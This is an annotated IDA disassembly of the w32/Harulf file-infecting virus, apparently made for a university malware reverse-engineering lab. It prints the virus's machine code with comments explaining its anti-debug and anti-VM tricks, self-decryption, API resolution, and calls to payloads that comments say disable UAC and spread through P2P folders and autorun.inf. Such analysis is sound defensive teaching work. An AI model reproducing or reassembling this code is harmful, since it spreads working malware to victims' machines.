.text:00401000                            ;
.text:00401000                            ; +-------------------------------------------------------------------------+
.text:00401000                            ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000                            ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
.text:00401000                            ; |                      License info: 48-BABB-7E64-E2                      |
.text:00401000                            ; |                     Georgia Institute of Technology                     |
.text:00401000                            ; +-------------------------------------------------------------------------+
.text:00401000                            ;
.text:00401000                            ; Input SHA256 : 5F3C200DD06A1B610D7325B97E948564855CFB6B6C57270037EA65D1B6923C92
.text:00401000                            ; Input MD5    : 491E53110DA0988C66D28B7860CEB330
.text:00401000                            ; Input CRC32  : E04C1F0D
.text:00401000
.text:00401000                            ; File Name   : /nethome/dgabrielyan3/Intro_to_Malware_Reverse_Eng/Lab/harulf.exe
.text:00401000                            ; Format      : Portable executable for 80386 (PE)
.text:00401000                            ; Imagebase   : 400000
.text:00401000                            ; Timestamp   : 4BC5AE6D (Wed Apr 14 12:00:45 2010)
.text:00401000                            ; Section 1. (virtual address 00001000)
.text:00401000                            ; Virtual size                  : 00001720 (   5920.)
.text:00401000                            ; Section size in file          : 00001800 (   6144.)
.text:00401000                            ; Offset to raw data for section: 00000200
.text:00401000                            ; Flags E0000020: Text Executable Readable Writable
.text:00401000                            ; Alignment     : default
.text:00401000
.text:00401000                                            .686p
.text:00401000                                            .mmx
.text:00401000                                            .model flat
.text:00401000
.text:00401000                            ; ===========================================================================
.text:00401000
.text:00401000                            ; Segment type: Pure code
.text:00401000                            ; Segment permissions: Read/Write/Execute
.text:00401000                            _text           segment para public 'CODE' use32
.text:00401000                                            assume cs:_text
.text:00401000                                            ;org 401000h
.text:00401000                                            assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text:00401000
.text:00401000                            ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000
.text:00401000                                            public start
.text:00401000                            start           proc near               ; DATA XREF: nfkt_this+FB\u2193o
.text:00401000                                                                    ; nfkt_this:loop_marker\u2193r
.text:00401000
.text:00401000                            arg_8           = dword ptr  0Ch
.text:00401000
.text:00401000                            ; FUNCTION CHUNK AT .text:00401028 SIZE 0000004F BYTES
.text:00401000                            ; FUNCTION CHUNK AT .text:00401277 SIZE 000000E9 BYTES
.text:00401000
.text:00401000 EB 08                                      jmp     short Stuck     ; jump to the Stuck
.text:00401000                            ; ---------------------------------------------------------------------------
.text:00401002                            sig1:                                   ; DATA XREF: start+2C0\u2193w
.text:00401002                                                                    ; start+34F\u2193r
.text:00401002 00 00 00 00                                dd 0
.text:00401006                            sig2:                                   ; DATA XREF: start+2C6\u2193w
.text:00401006                                                                    ; start+355\u2193r
.text:00401006 00 00 00 00                                dd 0
.text:0040100A                            ; ---------------------------------------------------------------------------
.text:0040100A
.text:0040100A                            Stuck:                                  ; CODE XREF: start\u2191j
.text:0040100A E8 02 00 00 00                             call    Here            ; jump to anti-debuhg routine
.text:0040100F EB 17                                      jmp     short getDelta  ; jump to the code that alllegedly is not being debugged
.text:0040100F                            start           endp ; sp-analysis failed
.text:0040100F
.text:00401011
.text:00401011                            ; =============== S U B R O U T I N E =======================================
.text:00401011
.text:00401011
.text:00401011                            Here            proc near               ; CODE XREF: start:Stuck\u2191p
.text:00401011                                                                    ; DATA XREF: start+3B\u2193o
.text:00401011 8B 04 24                                   mov     eax, [esp+0]    ; grab the address of the getDelta jump (0x40100F)
.text:00401014 50                                         push    eax             ; save it
.text:00401015 64 FF 35 00 00 00 00                       push    large dword ptr fs:0 ; save the old SEH (Structured Exception handeling) pointer
.text:0040101C 64 89 25 00 00 00 00                       mov     large fs:0, esp ; overwrite the SEH with jump to getDelta handeling
.text:00401023 33 C0                                      xor     eax, eax        ; eax =0
.text:00401025 8B 00                                      mov     eax, [eax]      ; causes null exception
.text:00401027 C3                                         retn
.text:00401027                            Here            endp ; sp-analysis failed
.text:00401027
.text:00401028                            ; ---------------------------------------------------------------------------
.text:00401028                            ; START OF FUNCTION CHUNK FOR start
.text:00401028
.text:00401028                            getDelta:                               ; CODE XREF: start+F\u2191j
.text:00401028 8B 44 24 0C                                mov     eax, [esp+arg_8] ; Operating system puts a pointer to the CONTEXT structure at esp + 0xC
.text:0040102C 8B A0 C4 00 00 00                          mov     esp, [eax+0C4h] ; read old value of the esp before the null exception. esp = old esp
.text:00401032 64 8F 05 00 00 00 00                       pop     large dword ptr fs:0 ; Restore the SEH
.text:00401039 5A                                         pop     edx             ; edx = addr of the return of Stuck function
.text:0040103A 5D                                         pop     ebp             ; edx = addr of the return of Stuck function
.text:0040103B 81 ED 11 10 40 00                          sub     ebp, offset Here ; ebp-= 0x401011
.text:00401041 83 C5 02                                   add     ebp, 2          ; ebp +=2
.text:00401044 83 FD 00                                   cmp     ebp, 0          ; if ebp is 0, the virus is decrypted
.text:00401047 74 29                                      jz      short endDecrypt ; skip the decryption loop
.text:00401049 BE 72 10 40 00                             mov     esi, offset endDecrypt ; grabbing the beggining of the actual virus code before decryption and it is also goingto be desination for decryption
.text:0040104E 03 F5                                      add     esi, ebp        ; adding the delta offset
.text:00401050 B9 20 17 00 00                             mov     ecx, 1720h      ; Virus size (num of bytes to process)
.text:00401055 81 E9 72 00 00 00                          sub     ecx, 72h ; 'r'  ; minus the stub size
.text:0040105B
.text:0040105B                            SecondStageDecryption:                  ; CODE XREF: start+70\u2193j
.text:0040105B 51                                         push    ecx             ; save the number of bytes
.text:0040105C 66 8B 0E                                   mov     cx, [esi]       ; grab 2 bytes from the virus
.text:0040105F D2 CD                                      ror     ch, cl          ; rotating 'ch' right 'cl' number of times
.text:00401061 86 E9                                      xchg    ch, cl          ; swap them
.text:00401063 66 89 0E                                   mov     [esi], cx       ; save it back into the virus
.text:00401066 83 C6 02                                   add     esi, 2          ; increment esi to the next bytes (skipping the 2 newly vetted bytes)
.text:00401069 59                                         pop     ecx             ; grab the num of bytes
.text:0040106A 83 E9 02                                   sub     ecx, 2          ; decremeant it by 2
.text:0040106D 83 F9 00                                   cmp     ecx, 0          ; check if 0 else, there is more to decrypt
.text:00401070 77 E9                                      ja      short SecondStageDecryption
.text:00401072
.text:00401072                            endDecrypt:                             ; CODE XREF: start+47\u2191j
.text:00401072                                                                    ; DATA XREF: start+49\u2191o
.text:00401072 E9 00 02 00 00                             jmp     fisrtVM         ; continue
.text:00401072                            ; END OF FUNCTION CHUNK FOR start
.text:00401072                            ; ---------------------------------------------------------------------------
.text:00401077 00                         dump_bytes      db 0                    ; DATA XREF: start+2D4\u2193o
.text:00401077                                                                    ; fixEnteryPoint+1B\u2193o ...
.text:00401078 00 00 00 00 00 00 00 00 00+                dd 7Fh dup(0)
.text:00401274 00 00 00                                   db 3 dup(0)
.text:00401277                            ; ---------------------------------------------------------------------------
.text:00401277                            ; START OF FUNCTION CHUNK FOR start
.text:00401277
.text:00401277                            fisrtVM:                                ; CODE XREF: start:endDecrypt\u2191j
.text:00401277 33 DB                                      xor     ebx, ebx        ; ebx = 0
.text:00401279 8B DC                                      mov     ebx, esp        ; ebx = esp
.text:0040127B 0F 00 43 08                                sldt    word ptr [ebx+8] ; Local Discripto table location loaded into stack
.text:0040127F 33 C0                                      xor     eax, eax        ; eax = 0
.text:00401281 8B 43 08                                   mov     eax, [ebx+8]    ; eax contains the LDT location, it's 0 if it's native but sime other value when in a VM
.text:00401284 0B C0                                      or      eax, eax        ; check if 0
.text:00401286 75 01                                      jnz     short secondVM  ; if not 0, we jump coz we are in a VM. (Old fashioned VM check)
.text:00401288 C3                                         retn
.text:00401289                            ; ---------------------------------------------------------------------------
.text:00401289
.text:00401289                            secondVM:                               ; CODE XREF: start+286\u2191j
.text:00401289 33 C0                                      xor     eax, eax        ; eax = 0
.text:0040128B 0F A2                                      cpuid                   ; getting CPUID with eax = 0 as argument and returns max input which is indication of what prcessor is in use
.text:0040128D 50                                         push    eax             ; save
.text:0040128E 33 C0                                      xor     eax, eax        ; eax = 0
.text:00401290 40                                         inc     eax             ; eax = 1
.text:00401291 0F A2                                      cpuid                   ; cpuid called with argument 1. Returns cpu signature into eax, feature flags in registers EDX and ECX, and additional feature info in register EBX. The 31st bit in ECX indicates whether on hypervisor or not.
.text:00401293 5B                                         pop     ebx             ; ebx = max input size
.text:00401294 33 C3                                      xor     eax, ebx        ; xor the signature with the manufacturer indication
.text:00401296 0B C0                                      or      eax, eax        ; check if result is 0
.text:00401298 75 01                                      jnz     short continue  ; take the jump only is it's not 0 aka not in a VM (wierd anti VM cehck)
.text:0040129A C3                                         retn
.text:0040129B                            ; ---------------------------------------------------------------------------
.text:0040129B
.text:0040129B                            continue:                               ; CODE XREF: start+298\u2191j
.text:0040129B E8 48 01 00 00                             call    get_kernel      ; call get kernel
.text:004012A0 E8 6F 01 00 00                             call    find_main_api   ; find apis
.text:004012A5 E8 A5 02 00 00                             call    find_other_apis ; find more
.text:004012AA E8 10 13 00 00                             call    polyizer        ; come back to this -> some instr translation and storing
.text:004012AF                            ; ---------------------------------------------------------------------------
.text:004012AF E8 AC 00 00 00                             call    getting_messagebox_api ; get the message box finction
.text:004012B4 8B 9D 22 1A 40 00                          mov     ebx, ss:old_eip[ebp] ; grab old eip (set to zero?)
.text:004012BA 8B 95 1E 1A 40 00                          mov     edx, ss:image_base[ebp] ; grab the image_base
.text:004012C0 89 9D 02 10 40 00                          mov     dword ptr ss:sig1[ebp], ebx ; storing old eip to sig1
.text:004012C6 89 95 06 10 40 00                          mov     dword ptr ss:sig2[ebp], edx ; storing imagebase to sig2
.text:004012CC 0B ED                                      or      ebp, ebp        ; is ebp (delta offset) zero?
.text:004012CE 74 13                                      jz      short sample_exe_infection ; if it is, jump to infect sample exe
.text:004012D0 03 D3                                      add     edx, ebx        ; edx = old eip + image base
.text:004012D2 8B FA                                      mov     edi, edx        ; edi = edx as destiantion
.text:004012D4 8D B5 77 10 40 00                          lea     esi, dump_bytes[ebp] ; pointer to dump_bytes
.text:004012DA B9 00 02 00 00                             mov     ecx, 200h       ; counter = 200h
.text:004012DF F3 A4                                      rep movsb               ; copy 200h bytes from dump_bytes to image base + old eip
.text:004012E1 EB 17                                      jmp     short next_gen  ; jump
.text:004012E3                            ; ---------------------------------------------------------------------------
.text:004012E3
.text:004012E3                            sample_exe_infection:                   ; CODE XREF: start+2CE\u2191j
.text:004012E3 E8 0B 00 00 00                             call    loc_4012F3      ; grab (filename?) from stack
.text:004012E3                            ; ---------------------------------------------------------------------------
.text:004012E8 73 61 6D 70 6C 65 2E 65 78+aSampleExe      db 'sample.exe',0       ; the first infection only for sample.exe
.text:004012F3                            ; ---------------------------------------------------------------------------
.text:004012F3
.text:004012F3                            loc_4012F3:                             ; CODE XREF: start:sample_exe_infection\u2191p
.text:004012F3 58                                         pop     eax             ; grab (filename?) from stack
.text:004012F4 E8 93 08 00 00                             call    nfkt_this       ; call infect on this file
.text:004012F9 C3                                         retn
.text:004012FA                            ; ---------------------------------------------------------------------------
.text:004012FA
.text:004012FA                            next_gen:                               ; CODE XREF: start+2E1\u2191j
.text:004012FA B9 FF 00 00 00                             mov     ecx, 0FFh       ; ecx = 0FF
.text:004012FF E8 42 11 00 00                             call    rand            ; get random value between 0 and FF
.text:00401304 89 85 C2 18 40 00                          mov     dword ptr ss:unk_4018C2[ebp], eax ; stroe that as the code
.text:0040130A E8 4B 07 00 00                             call    nfkt_exe        ; call infection routine for exe
.text:0040130F E8 8D 10 00 00                             call    getName         ; call get Name
.text:00401314 0B C0                                      or      eax, eax        ; check if it found it or not (ha...)
.text:00401316 74 1A                                      jz      short CorvinJumps ; if did not find it, jump
.text:00401318 E8 D7 10 00 00                             call    run_explorer    ; open windows explorer
.text:0040131D E8 07 0D 00 00                             call    payload2        ; download and save and open saddam photo on the 9th of every month
.text:00401322 E8 26 0F 00 00                             call    payload3        ; infect P2P folders with self under the name vistacrack.exe
.text:00401327 E8 21 0F 00 00                             call    payload3        ; ""
.text:0040132C E8 48 0F 00 00                             call    payload4        ; infect removable drives and add an autorun.inf file to run the virus
.text:00401331 C3                                         retn
.text:00401332                            ; ---------------------------------------------------------------------------
.text:00401332
.text:00401332                            CorvinJumps:                            ; CODE XREF: start+316\u2191j
.text:00401332 E8 7D 0B 00 00                             call    payload1        ; check if admin, modify LUA to disable UAC, kindly ask to run as admin
.text:00401337 E8 ED 0C 00 00                             call    payload2        ; download and save and open saddam photo on the 9th of every month
.text:0040133C E8 0C 0F 00 00                             call    payload3        ; infect P2P folders with self under the name vistacrack.exe
.text:00401341 E8 07 0F 00 00                             call    payload3        ; infect P2P folders with self under the name vistacrack.exe
.text:00401346 E8 2E 0F 00 00                             call    payload4        ; infect removable drives and add an autorun.inf file to run the virus
.text:0040134B 0B ED                                      or      ebp, ebp        ; is the bp zero? (no offset)
.text:0040134D 74 10                                      jz      short locret_40135F ; if it is, jump to retun, end program
.text:0040134F 8B 85 02 10 40 00                          mov     eax, dword ptr ss:sig1[ebp] ; grab offset adjustment
.text:00401355 8B 9D 06 10 40 00                          mov     ebx, dword ptr ss:sig2[ebp] ; grab offset adjustment
.text:0040135B 03 C3                                      add     eax, ebx        ; sum up adjustments
.text:0040135D FF E0                                      jmp     eax             ; return to host
.text:0040135F                            ; ---------------------------------------------------------------------------
.text:0040135F
.text:0040135F                            locret_40135F:                          ; CODE XREF: start+34D\u2191j
.text:0040135F C3                                         retn                    ; end program, return
.text:0040135F                            ; END OF FUNCTION CHUNK FOR start
.text:00401360
.text:00401360                            ; =============== S U B R O U T I N E =======================================
.text:00401360
.text:00401360
.text:00401360                            getting_messagebox_api proc near        ; CODE XREF: start+2AF\u2191p
.text:00401360 8D 85 D1 13 40 00                          lea     eax, aUser32Dll[ebp] ; eax = pointer to User32.dll string
.text:00401366 50                                         push    eax             ; push as argument
.text:00401367 FF 95 7B 17 40 00                          call    ss:AddrLoadLibrary[ebp] ; Call load library
.text:0040136D 89 85 DC 13 40 00                          mov     ss:User32DLL[ebp], eax ; save it to memory
.text:00401373 8D 85 C1 13 40 00                          lea     eax, aMessageboxa[ebp] ; pointer to name of message box function
.text:00401379 50                                         push    eax             ; push message box string as a param
.text:0040137A FF B5 DC 13 40 00                          push    ss:User32DLL[ebp] ; push user32 dll as an arg
.text:00401380 FF 95 49 14 40 00                          call    ss:GetProcAddress[ebp] ; call get proc addr
.text:00401386 89 85 CD 13 40 00                          mov     ss:AddrMessageBox[ebp], eax ; save addr of message box to memory
.text:0040138C C3                                         retn
.text:0040138C                            getting_messagebox_api endp ; sp-analysis failed
.text:0040138C
.text:0040138D                            ; ---------------------------------------------------------------------------
.text:0040138D                            ; START OF FUNCTION CHUNK FOR find_main_api
.text:0040138D                            ;   ADDITIONAL PARENT FUNCTION jumpToCode
.text:0040138D                            ;   ADDITIONAL PARENT FUNCTION loop_API
.text:0040138D                            ;   ADDITIONAL PARENT FUNCTION nfkt_this
.text:0040138D
.text:0040138D                            Exit:                                   ; CODE XREF: find_main_api+5C\u2193j
.text:0040138D                                                                    ; jumpToCode+2F\u2193j ...
.text:0040138D 6A 00                                      push    0
.text:0040138F FF 15 77 17 40 00                          call    ExitProcessF    ; call ExitProcess
.text:0040138F                            ; ---------------------------------------------------------------------------
.text:00401395 77 33 32 2F 48 61 72 75 6C+aW32HarulfCoded db 'w32/Harulf coded by fakedmnded!'
.text:004013B4 00                                         db    0
.text:004013B5 45                                         db  45h ; E
.text:004013B6 30                                         db  30h ; 0
.text:004013B7 46                                         db  46h ; F
.text:004013B8 2D                                         db  2Dh ; -
.text:004013B9 50                                         db  50h ; P
.text:004013BA 52                                         db  52h ; R
.text:004013BB 6F                                         db  6Fh ; o
.text:004013BC 6A                                         db  6Ah ; j
.text:004013BD 65                                         db  65h ; e
.text:004013BE 6B                         messageBoxN     db  6Bh ; k
.text:004013BF 74                                         db  74h ; t
.text:004013C0 00                                         db    0
.text:004013C1 4D 65 73 73 61 67 65 42 6F+aMessageboxa    db 'MessageBoxA'        ; DATA XREF: getting_messagebox_api+13\u2191o
.text:004013C1 78 41                      ; END OF FUNCTION CHUNK FOR find_main_api
.text:004013CC 00                                         db 0
.text:004013CD 00 00 00 00                AddrMessageBox  dd 0                    ; DATA XREF: getting_messagebox_api+26\u2191w
.text:004013CD                                                                    ; payload1+1C\u2193r
.text:004013D1 75 73 65 72 33 32 2E 64 6C+aUser32Dll      db 'user32.dll',0       ; DATA XREF: getting_messagebox_api\u2191o
.text:004013DC 00 00 00 00                User32DLL       dd 0                    ; DATA XREF: getting_messagebox_api+D\u2191w
.text:004013DC                                                                    ; getting_messagebox_api+1A\u2191r
.text:004013E0 00 00 00 00 00 00 00 00                    dd 2 dup(0)
.text:004013E8
.text:004013E8                            ; =============== S U B R O U T I N E =======================================
.text:004013E8
.text:004013E8
.text:004013E8                            get_kernel      proc near               ; CODE XREF: start:continue\u2191p
.text:004013E8
.text:004013E8                            arg_0           = dword ptr  4
.text:004013E8
.text:004013E8 EB 04                                      jmp     short loc_4013EE
.text:004013E8                            ; ---------------------------------------------------------------------------
.text:004013EA 00 00 00 00                Kernel32Base    dd 0                    ; DATA XREF: get_kernel+25\u2193w
.text:004013EA                                                                    ; find_main_api:loc_401462\u2193r ...
.text:004013EE                            ; ---------------------------------------------------------------------------
.text:004013EE
.text:004013EE                            loc_4013EE:                             ; CODE XREF: get_kernel\u2191j
.text:004013EE 8B 4C 24 04                                mov     ecx, [esp+arg_0] ; Grab an address that is inside the Kernel32 (on the stack from the CreateProcess call by the OS)
.text:004013F2
.text:004013F2                            loopFindKernel:                         ; CODE XREF: get_kernel+16\u2193j
.text:004013F2                                                                    ; get_kernel+1C\u2193j ...
.text:004013F2 33 D2                                      xor     edx, edx        ; edx = 0
.text:004013F4 49                                         dec     ecx             ; scan backwards
.text:004013F5 66 8B 51 3C                                mov     dx, [ecx+3Ch]   ; Grab beggining of the PE header
.text:004013F9 66 F7 C2 00 F8                             test    dx, 0F800h      ; check if it's a PE header
.text:004013FE 75 F2                                      jnz     short loopFindKernel ; if no, move tot he next iteration
.text:00401400 3B 4C 0A 34                                cmp     ecx, [edx+ecx+34h] ; check against address that PE should be loaded at
.text:00401404 75 EC                                      jnz     short loopFindKernel ; If doesn't match keep looking
.text:00401406 66 81 39 4D 5A                             cmp     word ptr [ecx], 5A4Dh ; compares to "MZ"
.text:0040140B 75 E5                                      jnz     short loopFindKernel ; jump back to the loop, continue if the MZ is not found yet
.text:0040140D 89 8D EA 13 40 00                          mov     ss:Kernel32Base[ebp], ecx ; ecx = KernelBase, store that
.text:00401413 C3                                         retn
.text:00401413                            get_kernel      endp
.text:00401413
.text:00401414
.text:00401414                            ; =============== S U B R O U T I N E =======================================
.text:00401414
.text:00401414
.text:00401414                            find_main_api   proc near               ; CODE XREF: start+2A0\u2191p
.text:00401414
.text:00401414                            ; FUNCTION CHUNK AT .text:0040138D SIZE 0000003F BYTES
.text:00401414
.text:00401414 EB 4C                                      jmp     short loc_401462
.text:00401414                            ; ---------------------------------------------------------------------------
.text:00401416                            PE_offset:                              ; DATA XREF: find_main_api+62\u2193w
.text:00401416 00 00 00 00                                dd 0
.text:0040141A                            Export_Dir_Va:                          ; DATA XREF: find_main_api+76\u2193w
.text:0040141A 00 00 00 00                                dd 0
.text:0040141E                            Export_Size:                            ; DATA XREF: find_main_api+6F\u2193w
.text:0040141E 00 00 00 00                                dd 0
.text:00401422 00 00                                      align 4
.text:00401424 00 00                                      db 2 dup(0)
.text:00401426                            numOfFunctions:                         ; DATA XREF: find_main_api+94\u2193w
.text:00401426 00 00 00 00                                dd 0
.text:0040142A                            ExportFuncAddr:                         ; DATA XREF: find_main_api+A3\u2193w
.text:0040142A                                                                    ; find_main_api+11E\u2193r
.text:0040142A 00 00 00 00                                dd 0
.text:0040142E                            AddrOfNameOrdinal:                      ; DATA XREF: find_main_api+C1\u2193w
.text:0040142E                                                                    ; find_main_api+10E\u2193r
.text:0040142E 00 00 00 00                                dd 0
.text:00401432                            exportFuncName:                         ; DATA XREF: find_main_api+B2\u2193w
.text:00401432                                                                    ; find_main_api+CB\u2193r
.text:00401432 00 00 00 00                                dd 0
.text:00401436                            ord_base:                               ; DATA XREF: find_main_api+8B\u2193w
.text:00401436 00 00 00 00                                dd 0
.text:0040143A 47 65 74 50 72 6F 63 41 64+aGetprocaddress db 'GetProcAddress',0   ; DATA XREF: find_main_api+D1\u2193o
.text:00401449                            ; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
.text:00401449 00 00 00 00                GetProcAddress  dd 0                    ; DATA XREF: getting_messagebox_api+20\u2191r
.text:00401449                                                                    ; find_main_api+12E\u2193w ...
.text:0040144D 47 65 74 4D 6F 64 75 6C 65+aGetmodulehandl db 'GetModuleHandleA',0
.text:0040145E 00 00                                      align 10h
.text:00401460 00 00                                      db 2 dup(0)
.text:00401462                            ; ---------------------------------------------------------------------------
.text:00401462
.text:00401462                            loc_401462:                             ; CODE XREF: find_main_api\u2191j
.text:00401462 8B BD EA 13 40 00                          mov     edi, ss:Kernel32Base[ebp] ; edi = KernelBase
.text:00401468 03 7F 3C                                   add     edi, [edi+3Ch]  ; offset into Image NT header signature
.text:0040146B 66 81 3F 50 45                             cmp     word ptr [edi], 4550h ; Check if it's "PE"
.text:00401470 0F 85 17 FF FF FF                          jnz     Exit            ; if not, exit
.text:00401476 89 BD 16 14 40 00                          mov     dword ptr ss:PE_offset[ebp], edi ; save the offset to the PE
.text:0040147C 8B 47 78                                   mov     eax, [edi+78h]  ; offset into the Export Image directory, so eax = virtual address of it
.text:0040147F 50                                         push    eax             ; save it on the stack
.text:00401480 8B 47 7C                                   mov     eax, [edi+7Ch]  ; eax = size of image export directory
.text:00401483 89 85 1E 14 40 00                          mov     dword ptr ss:Export_Size[ebp], eax ; save the size
.text:00401489 58                                         pop     eax             ; pop the virtual addr
.text:0040148A 89 85 1A 14 40 00                          mov     dword ptr ss:Export_Dir_Va[ebp], eax ; save the virtual addr
.text:00401490 03 85 EA 13 40 00                          add     eax, ss:Kernel32Base[ebp] ; eax = kernelBase + realtive virtual addr
.text:00401496 8B 50 10                                   mov     edx, [eax+10h]  ; edx = ordinal base
.text:00401499 03 95 EA 13 40 00                          add     edx, ss:Kernel32Base[ebp] ; ordinal base + Kernel Base
.text:0040149F 89 95 36 14 40 00                          mov     dword ptr ss:ord_base[ebp], edx ; store it
.text:004014A5 8B 50 18                                   mov     edx, [eax+18h]  ; edx = # of exported functions
.text:004014A8 89 95 26 14 40 00                          mov     dword ptr ss:numOfFunctions[ebp], edx ; save
.text:004014AE 8B 50 1C                                   mov     edx, [eax+1Ch]  ; relative virtual addr of exported functions
.text:004014B1 03 95 EA 13 40 00                          add     edx, ss:Kernel32Base[ebp] ; rva + kernel Base
.text:004014B7 89 95 2A 14 40 00                          mov     dword ptr ss:ExportFuncAddr[ebp], edx ; save the addr of exported functions
.text:004014BD 8B 50 20                                   mov     edx, [eax+20h]  ; relative virtual addr of exported function name
.text:004014C0 03 95 EA 13 40 00                          add     edx, ss:Kernel32Base[ebp] ; add kernelBase
.text:004014C6 89 95 32 14 40 00                          mov     dword ptr ss:exportFuncName[ebp], edx ; save
.text:004014CC 8B 50 24                                   mov     edx, [eax+24h]  ; relative virtual addr for name ordinal
.text:004014CF 03 95 EA 13 40 00                          add     edx, ss:Kernel32Base[ebp] ; add kernel base to make it not relative
.text:004014D5 89 95 2E 14 40 00                          mov     dword ptr ss:AddrOfNameOrdinal[ebp], edx ; save it
.text:004014DB 33 D2                                      xor     edx, edx        ; clear
.text:004014DD 33 C0                                      xor     eax, eax        ; clear
.text:004014DF 8B 85 32 14 40 00                          mov     eax, dword ptr ss:exportFuncName[ebp] ; eax = export function name
.text:004014E5 BA 3A 14 40 00                             mov     edx, offset aGetprocaddress ; edx = 'GetProcAddr'
.text:004014EA 03 D5                                      add     edx, ebp        ; add base pointer to the relative addr
.text:004014EC 33 C9                                      xor     ecx, ecx        ; clear
.text:004014EE 8B 38                                      mov     edi, [eax]      ; address of name[0]
.text:004014F0 03 BD EA 13 40 00                          add     edi, ss:Kernel32Base[ebp] ; add the kernelBase addr
.text:004014F6
.text:004014F6                            checkNewFuncName:                       ; CODE XREF: find_main_api+FD\u2193j
.text:004014F6 8B F2                                      mov     esi, edx        ; esi = addr of 'GetProcAddr'
.text:004014F8
.text:004014F8                            loopToNextLetter:                       ; CODE XREF: find_main_api+EC\u2193j
.text:004014F8 A6                                         cmpsb                   ; comapre esi with edi so the current function name from export directory with 'GetProcAddress'
.text:004014F9 75 07                                      jnz     short CheckNextExpFunc ; check next if it's not it
.text:004014FB 80 3F 00                                   cmp     byte ptr [edi], 0 ; have we reached the end of the function name string?
.text:004014FE 74 18                                      jz      short FoundGetProc ; jump if at the end coz we got it
.text:00401500 EB F6                                      jmp     short loopToNextLetter ; loop to chekc the rest
.text:00401502                            ; ---------------------------------------------------------------------------
.text:00401502
.text:00401502                            CheckNextExpFunc:                       ; CODE XREF: find_main_api+E5\u2191j
.text:00401502 66 83 C1 01                                add     cx, 1           ; cx +=1
.text:00401506 83 C0 04                                   add     eax, 4          ; incremeant eax to get to the next function name addr
.text:00401509 8B 38                                      mov     edi, [eax]      ; edi = next function name
.text:0040150B 03 BD EA 13 40 00                          add     edi, ss:Kernel32Base[ebp] ; add the kernelbase addr
.text:00401511 EB E3                                      jmp     short checkNewFuncName ; check New Func Name
.text:00401511                            ; ---------------------------------------------------------------------------
.text:00401513 E9                                         db 0E9h ; é
.text:00401514 75                                         db  75h ; u
.text:00401515 FE                                         db 0FEh ; þ
.text:00401516 FF                                         db 0FFh ; ÿ
.text:00401517 FF                                         db 0FFh ; ÿ
.text:00401518                            ; ---------------------------------------------------------------------------
.text:00401518
.text:00401518                            FoundGetProc:                           ; CODE XREF: find_main_api+EA\u2191j
.text:00401518 8B 38                                      mov     edi, [eax]      ; edi = pointer to function name
.text:0040151A 03 BD EA 13 40 00                          add     edi, ss:Kernel32Base[ebp] ; adds the kernel base
.text:00401520 D1 E1                                      shl     ecx, 1          ; ecx = ecx * 2 (eax the number of functions we checked in the loop) This is done to be able to index into the addr of name ordinals array which is in WORDs so the index is gonna be 2 times bigger
.text:00401522 8B 85 2E 14 40 00                          mov     eax, dword ptr ss:AddrOfNameOrdinal[ebp] ; eax = addr of name ordinal
.text:00401528 03 C1                                      add     eax, ecx        ; adding index offset to the base of arr of name ordinals
.text:0040152A 33 C9                                      xor     ecx, ecx        ; clear
.text:0040152C 66 8B 08                                   mov     cx, [eax]       ; cx = name ordinal of the function
.text:0040152F C1 E1 02                                   shl     ecx, 2          ; ecx = ecx * 4 for doubleword alighment of address array
.text:00401532 8B 85 2A 14 40 00                          mov     eax, dword ptr ss:ExportFuncAddr[ebp] ; eax = pointer to exportFuncaddress array
.text:00401538 03 C1                                      add     eax, ecx        ; index into it
.text:0040153A 8B 00                                      mov     eax, [eax]      ; grab the address if the function we are looking for (GetProc...)
.text:0040153C 03 85 EA 13 40 00                          add     eax, ss:Kernel32Base[ebp] ; add Kernel Base to make it not relative
.text:00401542 89 85 49 14 40 00                          mov     ss:GetProcAddress[ebp], eax ; save it
.text:00401548 C3                                         retn                    ; return
.text:00401548                            find_main_api   endp ; sp-analysis failed
.text:00401548
.text:00401549                            ; ---------------------------------------------------------------------------
.text:00401549 B8 00 00 00 00                             mov     eax, 0
.text:0040154E C3                                         retn
.text:0040154F
.text:0040154F                            ; =============== S U B R O U T I N E =======================================
.text:0040154F
.text:0040154F                            ; Attributes: thunk
.text:0040154F
.text:0040154F                            find_other_apis proc near               ; CODE XREF: start+2A5\u2191p
.text:0040154F E9 BF 02 00 00                             jmp     jumpToCode
.text:0040154F                            find_other_apis endp
.text:0040154F
.text:0040154F                            ; ---------------------------------------------------------------------------
.text:00401554 00 00 00 00                dll_base        dd 0                    ; DATA XREF: jumpToCode+14\u2193w
.text:00401554                                                                    ; jumpToCode+35\u2193w ...
.text:00401558 61 64 76 61 70 69 33 32 2E+aAdvapi32Dll    db 'advapi32.dll',0     ; DATA XREF: jumpToCode+1F\u2193o
.text:00401565 00 00 00                                   align 4
.text:00401568 00                                         db 0
.text:00401569 73 68 65 6C 6C 33 32 2E 64+aShell32Dll     db 'shell32.dll',0      ; DATA XREF: jumpToCode+4E\u2193o
.text:00401575 00 00 00                                   align 4
.text:00401578 00                                         db 0
.text:00401579 47 65 74 4C 6F 67 69 63 61+aGetlogicaldriv db 'GetLogicalDrives',0 ; DATA XREF: jumpToCode\u2193o
.text:0040158A 43 72 65 61 74 65 46 69 6C+aCreatefilea    db 'CreateFileA',0
.text:00401596 43 6C 6F 73 65 48 61 6E 64+aClosehandle    db 'CloseHandle',0
.text:004015A2 57 72 69 74 65 46 69 6C 65+aWritefile      db 'WriteFile',0
.text:004015AC 52 65 61 64 46 69 6C 65 00 aReadfile       db 'ReadFile',0
.text:004015B5 42 65 67 69 6E 55 70 64 61+aBeginupdateres db 'BeginUpdateResourceA',0
.text:004015CA 55 70 64 61 74 65 52 65 73+aUpdateresource db 'UpdateResourceA',0
.text:004015DA 45 6E 64 55 70 64 61 74 65+aEndupdateresou db 'EndUpdateResourceA',0
.text:004015ED 46 69 6E 64 52 65 73 6F 75+aFindresourcea  db 'FindResourceA',0
.text:004015FB 47 65 74 46 69 6C 65 53 69+aGetfilesize    db 'GetFileSize',0
.text:00401607 47 6C 6F 62 61 6C 41 6C 6C+aGlobalalloc    db 'GlobalAlloc',0
.text:00401613 53 65 74 46 69 6C 65 50 6F+aSetfilepointer db 'SetFilePointer',0
.text:00401622 47 65 74 56 65 72 73 69 6F+aGetversionexa  db 'GetVersionExA',0
.text:00401630 47 65 74 44 61 74 65 46 6F+aGetdateformata db 'GetDateFormatA',0
.text:0040163F 53 6C 65 65 70 00          aSleep          db 'Sleep',0
